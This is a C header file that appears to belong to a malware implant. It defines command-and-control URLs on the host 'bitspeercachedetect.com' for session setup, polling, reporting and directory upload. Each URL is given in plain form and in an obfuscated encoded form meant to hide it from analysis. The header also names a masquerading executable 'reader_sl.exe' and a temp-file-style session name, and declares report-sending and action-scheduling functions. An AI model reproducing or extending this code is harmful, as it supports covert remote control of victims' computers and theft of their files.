#ifndef D_COMMON_H_
#define D_COMMON_H_

#include <string>
#include <vector>

#define _STRING_PROTECTION
#ifndef _STRING_PROTECTION
#define S(x) (x)
#else
void S_INIT();
char* S(const char *in);
wchar_t* S(const wchar_t *in);
#endif



#ifndef _STRING_PROTECTION
#define SESSION_FILE_NAME L"~DF0D002FFD4FC6F0FE.TMP"
#define URL_HOST L"https://bitspeercachedetect.com/"
#define REQUEST_SESSION_NAME URL_HOST L"cgi-bin/session?name="
#define REQUEST_NOOP URL_HOST L"cgi-bin/noop?id="
#define REQUEST_REPORT URL_HOST L"cgi-bin/report?id="
#define REQUEST_DIR_UPLOAD URL_HOST L"cgi-bin/dir?id="
#define MAIN_FILENAME L"reader_sl.exe"
#else
#define SESSION_FILE_NAME L"\x4a\x6b\x77\x08\x45\x66\x61\x6b\x72\x69\x75\x0c\x47\x15\x67\x1f\x04\x69\x74\x16\x55\x1b\x01\x59"
#define URL_HOST L"\x5c\x5b\x45\x48\x3b\x79\x7e\x68\x01\x17\x1f\x0e\x38\x78\x63\x61\x1a\x18\x01\x17\x01"
#define REQUEST_SESSION_NAME L"\x5c\x5b\x45\x48\x3b\x79\x7e\x68\x01\x17\x1f\x0e\x38\x78\x63\x61\x1a\x18\x01\x17\x62\x31\x38\x74\x56\x46\x5f\x17\x72\x33\x22\x2a\x5d\x40\x5f\x07\x6f\x37\x3c\x3c\x09\x2f"
#define REQUEST_NOOP L"\x5c\x5b\x45\x48\x3b\x79\x7e\x68\x01\x17\x1f\x0e\x38\x78\x63\x61\x1a\x18\x01\x17\x62\x31\x38\x74\x56\x46\x5f\x17\x6f\x39\x3e\x29\x0b\x46\x55\x05\x01"
#define REQUEST_REPORT L"\x5c\x5b\x45\x48\x3b\x79\x7e\x68\x01\x17\x1f\x0e\x38\x78\x63\x61\x1a\x18\x01\x17\x62\x31\x38\x74\x56\x46\x5f\x17\x73\x33\x21\x36\x46\x5b\x0e\x51\x65\x6b\x51"
#define REQUEST_DIR_UPLOAD L"\x5c\x5b\x45\x48\x3b\x79\x7e\x68\x01\x17\x1f\x0e\x38\x78\x63\x61\x1a\x18\x01\x17\x62\x31\x38\x74\x56\x46\x5f\x17\x65\x3f\x23\x66\x5d\x4b\x0c\x38"
#define MAIN_FILENAME L"\x46\x4a\x50\x5c\x64\x24\x0e\x2a\x58\x01\x54\x40\x64\x56"
#endif
//#endif



static const size_t npos = -1;
void request_new_session();
void schedule_action(enum kActions intAction);
void noop_parse(const wchar_t *path);
void send_report(std::wstring& cmd, std::wstring& entry);
std::wstring generate_random(const int size);

#endif
